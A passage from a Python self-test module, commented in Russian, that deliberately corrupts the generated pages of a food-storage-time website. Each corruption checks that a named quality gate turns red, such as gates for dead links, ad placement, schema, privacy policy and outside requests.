         lambda c: c.__setitem__(any_page, c[any_page].replace(
             H1, H1 + "x</h1>" + H1, 1))),
        ("внутренние ссылки ведут на существующее",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", '<a href="/no-such-page/">x</a></body>'))),
        ("нет страниц-сирот",
         lambda c: c.__setitem__("lonely/index.html",
                                 c[any_page])),
        ("карта сайта совпадает с сайтом",
         lambda c: c.__setitem__("sitemap.xml", c["sitemap.xml"].replace(
             "</urlset>",
             "<url><loc>https://keepsuntil.com/ghost/</loc></url></urlset>"))),
        ("robots указывает карту",
         lambda c: c.__setitem__("robots.txt", "User-agent: *\nAllow: /\n")),
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", "<script>gtag('config','X')</script></body>"))),
        ("ответ первым в каждом разделе",
         lambda c: c.__setitem__(any_page, re.sub(
             r"<h2>(.*?)</h2>\s*<p([^>]*)>.*?</p>",
             lambda m: "<h2>%s</h2><p%s>Too short.</p>"
                       % (m.group(1), m.group(2)),
             c[any_page], count=1, flags=re.S))),
        ("нет близнецов по прозе",
         lambda c: c.__setitem__(other, c[any_page].replace(
             "<title>", "<title>x "))),
        ("одна величина — одно имя",
         lambda c: c.__setitem__(dur_page, re.sub(
             r'(<div class="dur">)[^<]+(</div>)',
             r"\g<1>999 fortnights\g<2>", c[dur_page], count=1))),
        ("одна величина — одно имя",
         lambda c: c.__setitem__(out_page, re.sub(
             r'(<div class="out" [^>]*data-plain=")[^"]+(")',
             r"\g<1>999 fortnights\g<2>", c[out_page], count=1))),
        ("страница не спорит сама с собой",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             H1, "<p>never at room temperature</p><ul class=\"rows\">"
                 "<li><span class=\"rk\">Pantry</span>"
                 "<span class=\"rv\">ok</span></li></ul>" + H1,
             1))),
    ]

    # Ветки, добавленные позже основной поломки, ломаются ОТДЕЛЬНО: гейт,
    # покрасневший на одной ветке, ничего не говорит про остальные.
    breaks += [
        ("скрипт не строит разметку",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</script>", "var x=document.body.innerHTML;</script>", 1))),
        ("скрипт не строит разметку",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             '"application/json" id="ku-index">[', '"application/json" '
             'id="ku-index">[{', 1))),
        ("скрипт один, встроенный, короткий",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             "</body>", chr(60) + "script>var z=1;" + chr(60)
             + "/script></body>"))),
        ("скрипт один, встроенный, короткий",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             "</body>", chr(60) + 'script type="application/json" id="two">[]'
             + chr(60) + "/script></body>"))),
    ]
    # Поломки для перенесённых гейтов. Гейт, ни разу не покрасневший, не
    # проверен — а однажды у нас гейт печатал «пройдено», не проверив ничего.
    breaks += [
        ("у каждого отсчёта своё поле",
         lambda c: c.__setitem__(
             dated, c[dated].replace('data-clock="opened" data-label=',
                                     'data-clock="gone" data-label=', 1))),
        ("у каждого отсчёта своё поле",
         lambda c: c.__setitem__(
             dated, c[dated].replace('data-hi="%s"' % dated_hi,
                                     'data-hi="0"', 1))),
        ("сигналом помечено то, что кончится первым",
         lambda c: c.__setitem__(
             dated, c[dated].replace(
                 '<div class="hot">\n<div class="cap">%s</div>' % dated_cap,
                 '<div class="hot">\n<div class="cap">In the pantry</div>', 1)
             .replace('<div class="hot"><div class="cap">%s</div>' % dated_cap,
                      '<div class="hot"><div class="cap">Not that one</div>',
                      1))),
        ("числа в прозе совпадают с сайтом",
         lambda c: c.__setitem__(
             "after-opening/index.html",
             c["after-opening/index.html"].replace("These 60 foods lose",
                                                   "These 61 foods lose", 1))),
        ("числа в прозе совпадают с сайтом",
         lambda c: c.__setitem__(
             "freezer-gains/index.html",
             c["freezer-gains/index.html"].replace("these 60 gain",
                                                   "these 59 gain", 1))),
        ("числа в прозе совпадают с сайтом",
         lambda c: c.__setitem__("index.html", re.sub(
             r"<b>\d+</b> foods across",
             "<b>999</b> foods across", c["index.html"], count=1))),
        ("рекламные места стоят по объявлению",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             H1, '<div class="ad ad-flow">Advertisement</div>' + H1, 1))),
        ("рекламные места точного размера", _break_ad_css),
        ("нет двойного экранирования",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             H1, "<p>&amp;mdash;</p>" + H1, 1))),
        ("объявленные классы применяются",
         lambda c: [c.__setitem__(k2, v.replace('class="quiet"',
                                                'class="quietx"'))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        ("применённые классы объявлены",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             'class="stub"', 'class="stub nowhere"', 1))),
        ("у каждого отсчёта своё поле",
         lambda c: [c.__setitem__(k2, v.replace("data-lo=", "data-was="))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        ("сигналом помечено то, что кончится первым",
         lambda c: [c.pop(k2) for k2 in list(c)
                    if _products({k2: c[k2]})]),
        ("страница не спорит сама с собой",
         lambda c: [c.__setitem__(k2, v.replace('<span class="rk">',
                                                '<span class="rq">'))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        ("числа в README совпадают со сборкой",
         lambda c: [c.pop(k2) for k2 in list(c)[:1]
                    if _products({k2: c[k2]})]),
        ("числа в README совпадают со сборкой",
         lambda c: c.__setitem__("extra.txt", "лишний файл в выкладке")),
        ("слова совпадают с разметкой",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", "<p>Give the table the day it went in.</p></body>",
             1))),
        ("id не повторяется на странице",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             '<div class="stub" id="stub">',
             '<p id="stub">x</p><div class="stub" id="stub">', 1))),
        ("нет ссылок на самих себя",
         lambda c: c.__setitem__("all/index.html",
                                 c["all/index.html"].replace(
                                     "</body>",
                                     '<a href="/all/">loop</a></body>', 1))),
        ("поиск ведёт на существующее",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             '"/bacon/"', '"/no-such-food/"'))),
        ("поиск ведёт на существующее",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             '["Bacon","/bacon/"', '["Zzbacon","/bacon/"', 1))),
        ("число согласовано со словом рядом",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             H1, "<p>1 food below keep longer than this.</p>" + H1, 1))),
        ("число согласовано со словом рядом",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", "<p>1 days sealed is the answer.</p></body>", 1))),
        ("выкладка совпадает с генератором",
         lambda c: c.__setitem__(any_page, c[any_page] + "<!-- not on disk -->")),
        # --- строка списка вне списка: 448 таких на 221 странице
        ("строк списка вне списка нет",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", "<li>orphan</li></body>", 1))),
        ("строк списка вне списка нет",
         lambda c: [c.__setitem__(k2, v.replace("<li>", "<span>")
                                  .replace("</li>", "</span>"))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        # --- отступы: руками, база не база, пустая выборка
        ("отступы выведены из одной базы", _break_spacing),
        ("отступы выведены из одной базы", _break_base),
        ("отступы выведены из одной базы", _break_spacing_empty),
        # --- кегли: мимо шкалы, мелкий основной, ступени рядом, пусто
        ("трекинг не наследуется потомку", _break_tracking_inherited),
        ("кегли взяты из шкалы", _break_size_offscale),
        ("кегли взяты из шкалы", _break_size_body),
        ("кегли взяты из шкалы", _break_size_steps),
        ("кегли взяты из шкалы", _break_size_empty),
        # --- бирка: не помещается, и бирок нет вовсе
        ("бирка помещается на один экран", _break_label_budget),
        ("бирка помещается на один экран", _break_label_empty),
        # Состояние, потерявшее свой подзаголовок, — это либо молча
        # выброшенная строка источника, либо три разных окна под одним именем.
        ("каждое состояние названо",
         lambda c: c.__setitem__(kinded,
                                 c[kinded].replace(kind_head, "", 1))),
        ("каждое состояние названо",
         lambda c: c.__setitem__(
             plain, c[plain].replace("</body>",
                                     kind_head + "</body>", 1))),
        ("каждое состояние названо",
         lambda c: [c.__setitem__(k2, v.replace('content="product"',
                                                'content="page"'))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        ("соседи — другие продукты",
         lambda c: c.__setitem__(
             plain, c[plain].replace('<li><a href="%s"' % nb_href,
                                     '<li><a href="/%s"'
                                     % plain[:-len("index.html")], 1))),
        ("соседи — другие продукты",
         lambda c: c.__setitem__(
             plain, re.sub(r"<h2>Items that behave the same way</h2>.*?</ul>",
                           "", c[plain], count=1, flags=re.S))),
        ("соседи — другие продукты",
         lambda c: [c.__setitem__(k2, v.replace('content="product"',
                                                'content="page"'))
                    for k2, v in list(c.items()) if k2.endswith(".html")]),
        ("голова ниши выпущена", _break_head_terms),
        ("две стороны расчёта различны",
         lambda c: c.__setitem__(calc_page, re.sub(
             r'<span class="calc">([^ ]+) ([^<]*)&divide; ([^ ]+) [^<]*</span>',
             r'<span class="calc">' + chr(92) + r"1 " + chr(92) + "2&divide; "
             + chr(92) + r"3 " + chr(92) + r'2</span>',
             c[calc_page], count=1))),
        ("две стороны расчёта различны",
         lambda c: c.__setitem__(calc_page, re.sub(
             r'<span class="calc">([^<]*)&divide; [0-9]+ ',
             r'<span class="calc">' + chr(92) + r"1&divide; 0 ",
             c[calc_page], count=1))),
        ("страница не спорит сама с собой",
         lambda c: c.__setitem__(
             no_freeze_page,
             c[no_freeze_page].replace(
                 '<span class="rk">In the freezer</span>'
                 '<span class="rv">not recommended</span>',
                 '<span class="rk">In the freezer</span>'
                 '<span class="rv">9 months</span>', 1))),
    ]

    # Девять гейтов «одна величина — одна функция». Каждый ломается ОТДЕЛЬНО
    # по каждой ветке: гейт, покрасневший на одной, ничего не говорит про
    # остальные.
    breaks += [
        ("витрина печатает связывающее окно",
         lambda c: c.__setitem__(listed, c[listed].replace(
             '<span class="v">%s' % listed_v,
             '<span class="v">99 years in the pantry', 1))),
        ("витрина печатает связывающее окно",
         lambda c: c.__setitem__("freezer-gains/index.html", re.sub(
             r'<span class="v">([0-9.]+) times longer frozen',
             '<span class="v">1234 times longer frozen',
             c["freezer-gains/index.html"], count=1))),
        ("витрина печатает связывающее окно",
         lambda c: c.__setitem__("after-opening/index.html", re.sub(
             r'<span class="v">([0-9.]+) times shorter once open',
             '<span class="v">4321 times shorter once open',
             c["after-opening/index.html"], count=1))),
        ("величина списка есть на странице цели",
         lambda c: c.__setitem__(title_page, re.sub(
             r"<title>[^<]*</title>", "<title>Nothing at all</title>",
             re.sub(r'<meta name="description" content="[^"]*">',
                    '<meta name="description" content="Nothing here either, '
                    'and this line is long enough to pass the head gate on '
                    'its own without carrying any storage window.">',
                    c[title_page], count=1), count=1))),
        ("расчёт даёт напечатанное число",
         lambda c: c.__setitem__(cost_page, c[cost_page].replace(
             '<div class="x">%s&times;' % cost_x,
             '<div class="x">777&times;', 1))),
        ("расчёт даёт напечатанное число",
         lambda c: c.__setitem__(frozen_page, re.sub(
             r'<div class="t">[^<]*<span class="calc">([0-9]+) days frozen',
             '<div class="t">What opening the package costs'
             '<span class="calc">' + chr(92) + '1 days frozen',
             c[frozen_page], count=1))),
        ("расчёт даёт напечатанное число",
         lambda c: c.__setitem__(cost_page, re.sub(
             r'<span class="calc">([0-9]+) ([^<]*)&divide; ([0-9]+) ',
             '<span class="calc">1 ' + chr(92) + '2&divide; ' + chr(92)
             + '3 ', c[cost_page], count=1))),
        ("бирка и проза называют одну кратность",
         lambda c: c.__setitem__(mult_page, c[mult_page].replace(
             '<div class="x">%s&times;' % mult_x,
             '<div class="x">6.6&times;', 1))),
        ("на предел в тепле не делят",
         lambda c: c.__setitem__(warm_page, c[warm_page].replace(
             "prints no multiplier against the room-temperature", "prints "
             "something else about the room-temperature", 1))),
        ("на предел в тепле не делят",
         lambda c: c.__setitem__(cost_page, re.sub(
             r'<span class="calc">([^<]*)&divide; [0-9]+ day',
             '<span class="calc">' + chr(92) + '1&divide; 0 day',
             c[cost_page], count=1))),
        ("доля не печатается на краю",
         lambda c: c.__setitem__(pct_page, re.sub(
             r"keeps longer than [0-9]+% of",
             "keeps longer than 0% of", c[pct_page], count=1))),
        ("доля не печатается на краю",
         lambda c: c.__setitem__(pct_page, c[pct_page].replace(
             "</body>", "<p>Bread is the shortest-lived thing the USDA files "
             "under Baked Goods: 2 days, where the item above it, Bagel, "
             "holds 2 days.</p></body>", 1))),
        ("слова источника напечатаны прозой",
         lambda c: c.__setitem__(tip_page, c[tip_page].replace(
             tip_txt, "gone", 1))),
        ("слова источника напечатаны прозой",
         lambda c: c.__setitem__(tip_page, c[tip_page].replace(
             '<p class="tip">',
             '<ul class="rows"><li><span class="rk">Pantry</span>'
             '<span class="rv">%s</span></li></ul><p class="tip">'
             % tip_txt[:200], 1))),
        ("нечисловой ответ назван",
         lambda c: c.__setitem__(says_page, c[says_page].replace(
             says_val, "&mdash;"))),
        ("нечисловой ответ назван",
         lambda c: c.__setitem__(pantry_says_page,
                                 c[pantry_says_page].replace(
                                     "</body>", "<p>The USDA rates this item "
                                     "cold or frozen and never at room "
                                     "temperature.</p></body>", 1))),
        ("нечисловой ответ назван",
         lambda c: c.__setitem__(excl_says_page,
                                 c[excl_says_page]
                                 .replace("is not blank either", "is fine")
                                 .replace("answered in words instead",
                                          "answered somehow"))),
        ("главная не спорит со страницами",
         lambda c: _must_change(c, "index.html", re.sub(
             r"((?:belongs to <a href=\"/[^/\"]+/\">[^<]*</a>: "
             r"|is shared by .{0,200}?, each ))[0-9.]+ times",
             chr(92) + "g<1>1.5 times", c["index.html"], count=1,
             flags=re.S))),
        ("главная не спорит со страницами",
         lambda c: _must_change(c, "index.html", c["index.html"].replace(
             "largest of those freezer gains on this site",
             "biggest number we could find", 1))),
        # Ничья, объявленная единоличным первым местом, — ровно тот дефект,
        # что стоял на главной до 16.09.2026.
        ("главная не спорит со страницами",
         lambda c: c.__setitem__("index.html", re.sub(
             r"largest of those freezer gains on this site is shared by "
             r"(.{0,200}?), each ([0-9.]+) times",
             lambda m: ("largest of those freezer gains on this site belongs "
                        'to <a href="/x/">x</a>: ' + m.group(2) + " times"),
             c["index.html"], count=1, flags=re.S))),
        ("сигналом помечено то, что кончится первым",
         lambda c: c.__setitem__(wrong_page, re.sub(
             r'(<div class="hot">\s*<div class="cap">)[^<]*',
             lambda m: m.group(1) + wrong_worse, c[wrong_page], count=1))),
        ("оговорка соответствует своему окну",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             '<div class="means">%s</div>' % _chip_s,
             '<div class="means">%s</div>' % _chip_q, 1))),
        ("оговорка соответствует своему окну",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             pr.SAFETY_SENTENCE, "It goes off eventually.", 1))),
        ("оговорка соответствует своему окну",
         lambda c: c.__setitem__(pure_safety, c[pure_safety].replace(
             "</body>", "<p>%s</p></body>" % pr.QUALITY_SENTENCE, 1))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             pr.NOW_WHAT_HEAD, "Some more numbers", 1))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             '<a href="/past-the-date/">', '<a href="/all/">'))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             pr.DISCARD_NOW, "Use your judgement.", 1))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             "</body>", "<p><span data-std>%s</span></p></body>"
             % pr.LOOK_FRESH, 1))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(safety_page, c[safety_page].replace(
             pr.TWO_HOUR, "Keep an eye on it.", 1))),
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(look_page, c[look_page].replace(
             look_own, "Have a look at it.", 1))),
        # Признак порчи ЧУЖОЙ рубрики: фраза остаётся объявленной и помеченной,
        # и всё равно обязана покраснеть — иначе «банка вздулась» вернётся на
        # страницу винограда с зелёной доской.
        ("страница говорит, что делать дальше",
         lambda c: c.__setitem__(look_page, c[look_page].replace(
             look_own, look_other, 1))),
        ("общая фраза объявлена",
         lambda c: c.__setitem__(std_page, re.sub(
             r"<span data-std>.*?</span>",
             "<span data-std>Eat it whenever you like.</span>",
             c[std_page], count=1, flags=re.S))),
        ("общая фраза объявлена",
         lambda c: c.__setitem__(std_page, c[std_page].replace(
             "</body>", "<p>%s</p></body>" % pr.ASSUMPTIONS, 1))),
        ("общая фраза объявлена",
         lambda c: c.__setitem__(std_page, c[std_page].replace(
             "</body>", ("<p><span data-std>%s</span></p>" % pr.ASSUMPTIONS)
             * 30 + "</body>", 1))),
        ("общая фраза объявлена",
         lambda c: [c.__setitem__(k, v.replace(pr.WHOSE_FIGURES, "Both are "
                                               "the source's."))
                    for k, v in list(c.items()) if k.endswith(".html")]),
        ("сужение отношения названо",
         lambda c: c.__setitem__(scope_page, c[scope_page].replace(
             pr.SCOPE_HEAD, "Two comparable numbers"))),
        ("сужение отношения названо",
         lambda c: c.__setitem__(scope_page, c[scope_page].replace(
             scope_note, "Nothing worth saying here", 1))),
        ("запрет морозилки объяснён",
         lambda c: c.__setitem__(nofreeze_page, c[nofreeze_page].replace(
             pr.NOT_RECOMMENDED_WHY, "That is all the source says.", 1))),
        ("запрет морозилки объяснён",
         lambda c: c.__setitem__(nofreeze_page, c[nofreeze_page].replace(
             "</body>", "<p>There is no colder option to fall back on.</p>"
             "</body>", 1))),
    ]

    # Реклама, схема, карточка, контраст, почта и источник. Ветки ломаются
    # ПООТДЕЛЬНОСТИ: гейт, покрасневший на одной, ничего не говорит про
    # остальные, а три гейта на этом сайте уже переставали запускаться молча.
    prod_page = sorted(prods)[0]
    hub_page = next(p for p, t2 in sorted(_html(files).items())
                    if _page_type(t2) == "hub")
    legal_page = "privacy/index.html"
    method_key = rd.METHOD_PATH.strip("/") + "/index.html"

    def _strip_html(c):
        for k2 in list(c):
            if k2.endswith(".html"):
                c.pop(k2)

    def _break_blind_to_carriers(c):
        """Гейт, ослепший на ВСЕ несущие, обязан краснеть пустой выборкой.

        ПРЕЖНЯЯ ПОЛОМКА ПЕРЕСТАЛА ЛОМАТЬ, и самопроверка это поймала. Она
        переименовывала три вещи — `href=`, `src=` и `url(` — и слепила
        ровно тот гейт, который только их и читал. Расширенный гейт после
        этой же поломки продолжал видеть `content` у meta, выборка не
        пустела, и он зеленел на слепом сайте. Поломка, тихо переставшая
        ломать, — это тот же дефект, что гейт, тихо переставший запускаться.

        Поэтому список атрибутов берётся ИЗ ОБЪЯВЛЕНИЯ: добавили несущую —
        поломка ослепляет и её.
        """
        names = set()
        for _k3, attrs3, _t3, _kind3, _h3 in rd.FETCH_CARRIERS:
            names.update(attrs3)
        for k2, v in list(c.items()):
            if not k2.endswith(".html"):
                continue
            for a3 in sorted(names, key=len, reverse=True):
                v = v.replace(a3 + "=", "x" + a3 + "=")
            v = v.replace("url(", "uxl(").replace("@import", "@imxort")
            c[k2] = v

    # Опоры новых поломок. Ищутся В СОБРАННОМ по признаку, а не по имени:
    # поломка, промахнувшаяся мимо цели, оставляет гейт непроверенным и
    # выглядит ровно как пройденная самопроверка.
    twin_a, twin_b = sorted(prods)[0], sorted(prods)[1]
    head_page, head_title, head_num = next(
        (p, m.group(0), m.group(1))
        for p, t2 in sorted(prods.items())
        for m in [re.search(r"(?<=<title>)[^<]*?(?<![0-9.])"
                            r"([0-9]+)\s+(?:hour|day|week|month|year)s?[^<]*",
                            t2)]
        if m)
    head_lie = head_title.replace(head_num, "997", 1)
    head_desc, head_desc_num = next(
        (m.group(1), m.group(2))
        for p2, t2 in [(head_page, prods[head_page])]
        for m in [re.search(r'<meta name="description" content="((?:[^"]*?)'
                            r"(?<![0-9.])([0-9]+)\s+"
                            r'(?:hour|day|week|month|year)s?[^"]*)"', t2)]
        if m)
    head_desc_lie = head_desc.replace(head_desc_num, "998", 1)
    # Страница, у которой источник про кладовую НЕ молчит: только на такой
    # выдуманное молчание обязано покраснеть.
    _raw = json.load(io.open(fk.RAW, encoding="utf-8"))
    _byid = {str(x["id"]): x for x in _raw["product_data"]}
    _fld = {k: f for k, f, _l in fk.SLOTS}
    loud_page = next(
        p for p in sorted(prods)
        if p[:-len("/index.html")] in _corp
        and any(_raw_is_a_figure((_byid.get(str(i)) or {}).get(_fld[k], ""))
                for i in (_corp[p[:-len("/index.html")]].get("row_ids")
                          or [_corp[p[:-len("/index.html")]]["id"]])
                for k in _SOURCE_FAMILIES["pantry"])
        and "no pantry figure exists for it" not in _visible(prods[p]))

    breaks += [
        ("написание американское",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "</body>", "<p>The flavour of its neighbours.</p></body>"))),
        # Британское слово в ОПИСАНИИ: видимого текста нет, а в выдаче оно
        # единственное, что человек прочтёт.
        ("написание американское",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '<meta name="description" content="',
             '<meta name="description" content="Colour and flavour. ', 1))),
        ("написание американское", _strip_html),
        ("голова страницы заполнена верно",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'(<meta name="description" content="[^"]{60,90})[^"]*"',
             chr(92) + '1 and the rest of the sentence is cut off mid-wor"',
             c[prod_page], count=1))),
        # --- браузер не ходит наружу: ссылка, ресурс и пустая выборка
        ("браузер не ходит наружу",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", '<a href="https://evil.example/x">x</a></body>'))),
        # Подмена именно ИМЕНИ атрибута: «data-href» всё ещё содержит «href»
        # как подстроку, и первая попытка этой поломки оставила гейт
        # непроверенным — ровно тот случай, ради которого самопроверка и есть.
        ("браузер не ходит наружу", _break_blind_to_carriers),
        # --- скрипты: второй блок схемы и неразбираемая схема
        ("скрипт один, встроенный, короткий",
         lambda c: c.__setitem__(any_page, c[any_page].replace(
             "</body>", chr(60) + 'script type="application/ld+json">{}'
             + chr(60) + "/script></body>"))),
        ("скрипт не строит разметку",
         lambda c: c.__setitem__(any_page, re.sub(
             r'(<script type="application/ld\+json">)\{',
             chr(92) + "1{,", c[any_page], count=1))),
        # --- политика: обе стороны
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(legal_page, c[legal_page]
                                 .replace("Advertising", "Promotion")
                                 .replace("advertising", "promotion"))),
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(legal_page, c[legal_page].replace(
             "</body>", "<p>This site carries no advertising.</p></body>"))),
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(legal_page, c[legal_page].replace(
             "No third-party script loads on any page",
             "Some scripts may load"))),
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(legal_page, c[legal_page].replace(
             "</body>", "<p>This site uses a privacy-focused analytics "
             "service to count page views.</p></body>"))),
        ("политика совпадает с разметкой",
         lambda c: c.__setitem__(legal_page, c[legal_page].replace(
             "</body>", "<p>Cookies are used only where you have agreed to "
             "them.</p></body>"))),
        # --- рекламные места: пропало, опустело, приехало не туда, и пусто
        ("рекламные места стоят по объявлению",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'<div class="ad ad-rail">.*?</div>', "", c[prod_page],
             count=1, flags=re.S))),
        ("рекламные места стоят по объявлению",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'(<div class="ad ad-lead">).*?(</div>)',
             chr(92) + "1" + chr(92) + "2", c[prod_page], count=1,
             flags=re.S))),
        ("рекламные места стоят по объявлению",
         lambda c: c.__setitem__(legal_page, c[legal_page].replace(
             "</body>", '<div class="ad ad-lead">x</div></body>'))),
        ("рекламные места стоят по объявлению",
         lambda c: [c.__setitem__(k2, re.sub(
             r'<div class="ad ad-[a-z]+">.*?</div>', "",
             v.replace('content="product"', 'content="page"')
             .replace('content="hub"', 'content="page"')
             .replace('content="index"', 'content="page"'),
             flags=re.S))
             for k2, v in list(c.items()) if k2.endswith(".html")]),
        # --- размеры: CSS против объявления, влезание, и флаг
        ("рекламные места точного размера", _break_ad_css),
        ("рекламные места точного размера", _break_ad_fit),
        ("рекламные места точного размера", _break_ads_off),
        # --- ответ выше рекламы
        ("ответ выше первой рекламы",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '<div class="label">',
             '<div class="label"><div class="ad ad-rail">x</div>', 1))),
        ("ответ выше первой рекламы",
         lambda c: [c.__setitem__(k2, re.sub(
             r'<div class="ad ad-[a-z]+">.*?</div>', "", v, flags=re.S))
             for k2, v in list(c.items()) if k2.endswith(".html")]),
        # --- контраст
        ("контраст пар в обеих темах", _break_contrast),
        # --- схема: пропала, выдумала поле, разошлась со страницей, пусто
        ("схема совпадает со страницей",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'<script type="application/ld\+json">.*?</script>', "",
             c[prod_page], count=1, flags=re.S))),
        ("схема совпадает со страницей",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '"@context":"https://schema.org"',
             '"@context":"https://schema.org","aggregateRating":"4.8"', 1))),
        ("схема совпадает со страницей",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'("url":"[^"]*","name":)"[^"]*"',
             chr(92) + '1"Nothing of the kind"', c[prod_page], count=1))),
        ("схема совпадает со страницей", _strip_html),
        # --- карточка шаринга
        ("карточка шаринга совпадает с головой",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'<meta property="og:url" content="[^"]*">', "",
             c[prod_page], count=1))),
        ("карточка шаринга совпадает с головой",
         lambda c: c.__setitem__(prod_page, re.sub(
             r'(<meta property="og:title" content=")[^"]*',
             chr(92) + "1Something else", c[prod_page], count=1))),
        ("карточка шаринга совпадает с головой",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '<meta name="twitter:card"',
             '<meta property="og:image" content="https://x/y.png">'
             '<meta name="twitter:card"', 1))),
        ("карточка шаринга совпадает с головой", _strip_html),
        # --- почта
        ("адрес почты на своём домене",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "</body>", "<p>info@bilingoplus.com</p></body>"))),
        ("адрес почты на своём домене",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "</body>", "<p>%s</p></body>" % rd.CONTACT))),
        ("адрес почты на своём домене",
         lambda c: c.__setitem__("contact/index.html",
                                 c["contact/index.html"].replace(
                                     rd.CONTACT, "the form below"))),
        # --- источник
        ("источник назван и проверяем",
         lambda c: c.__setitem__(method_key, c[method_key].replace(
             rd.SOURCE_URL, "/all/"))),
        ("источник назван и проверяем",
         lambda c: c.__setitem__(method_key, c[method_key].replace(
             rd.SOURCE_RETRIEVED, "some time ago"))),
        ("источник назван и проверяем",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             'href="%s"' % rd.METHOD_PATH, 'href="/all/"'))),
        # --- поиск, навигация и мёртвые контролы
        ("поиск ведёт на существующее",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             'id="ku-find"', 'id="ku-gone"', 1))),
        ("поиск ведёт на существующее",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "]</script>", ',["Ghost","/ghost/","x",[]]]</script>', 1))),
        ("поиск ведёт на существующее",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             'data-stop="', 'data-stops="', 1))),
        ("мёртвых контролов нет",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "</body>", chr(60) + 'input type="date" id="kd-x">' + "</body>"))),
        ("мёртвых контролов нет",
         lambda c: c.__setitem__(dated, re.sub(
             r'data-plain="[^"]*"', 'data-plain=""', c[dated], count=1))),
        ("мёртвых контролов нет",
         lambda c: c.__setitem__(dated, re.sub(
             r'data-plain="[^"]*"', 'data-plain="Pick the day above"',
             c[dated], count=1))),
        ("мёртвых контролов нет",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             'class="findp"', 'class="gone"', 1))),
        ("страница ведёт вверх и вбок",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             'href="/category/', 'href="/notacategory-'))),
        ("страница ведёт вверх и вбок", _kill_sideways),
        ("страница ведёт вверх и вбок", _kill_rankings),
        ("страница ведёт вверх и вбок", _break_top_links),
        # --- слова, которыми страницу ищут
        ("страница несёт слова запроса",
         lambda c: c.__setitem__(q_sing, re.sub(
             r'<h1 class="item[^"]*">.*?</h1>', '<h1 class="item">Food</h1>',
             c[q_sing], count=1, flags=re.S))),
        ("страница несёт слова запроса",
         lambda c: c.__setitem__(q_sing, c[q_sing].replace(
             ">How long does</span>", ">How long do</span>", 1))),
        ("страница несёт слова запроса",
         lambda c: c.__setitem__(q_plur, c[q_plur].replace(
             ">How long do</span>", ">How long does</span>", 1))),
        ("страница несёт слова запроса",
         lambda c: c.__setitem__(q_sing, re.sub(
             r"<title>.*?</title>", "<title>Nothing to see</title>",
             c[q_sing], count=1, flags=re.S))),
        ("страница несёт слова запроса",
         lambda c: c.__setitem__(desc_page, c[desc_page].replace(
             desc_verb, desc_verb.replace("keeps", "keep"), 1))),
        # --- счёт отвечает на своё утверждение: неверное число и пропавшая
        #     фраза. Второе — тот самый «гейт, переставший запускаться».
        ("счёт отвечает на своё утверждение",
         lambda c: c.__setitem__(claim_page, c[claim_page].replace(
             "as for %s of" % claim_n, "as for 1 of", 1))),
        ("счёт отвечает на своё утверждение",
         lambda c: c.__setitem__(claim_page, c[claim_page].replace(
             "of the %s foods in the data that get no pantry time at all"
             % claim_total,
             "of the 999 foods in the data that get no pantry time at all",
             1))),
        ("счёт отвечает на своё утверждение", _reword_claim),
        # --- строки имён: чужая величина, чужое имя, пустой список и
        #     корпусная пустая выборка
        ("строки имён сверены с источником",
         lambda c: c.__setitem__(names_page, c[names_page].replace(
             '<span class="rk">%s</span><span class="rv">%s</span>'
             % (name_nm, name_val),
             '<span class="rk">%s</span><span class="rv">99 fortnights</span>'
             % name_nm, 1))),
        ("строки имён сверены с источником",
         lambda c: c.__setitem__(names_page, c[names_page].replace(
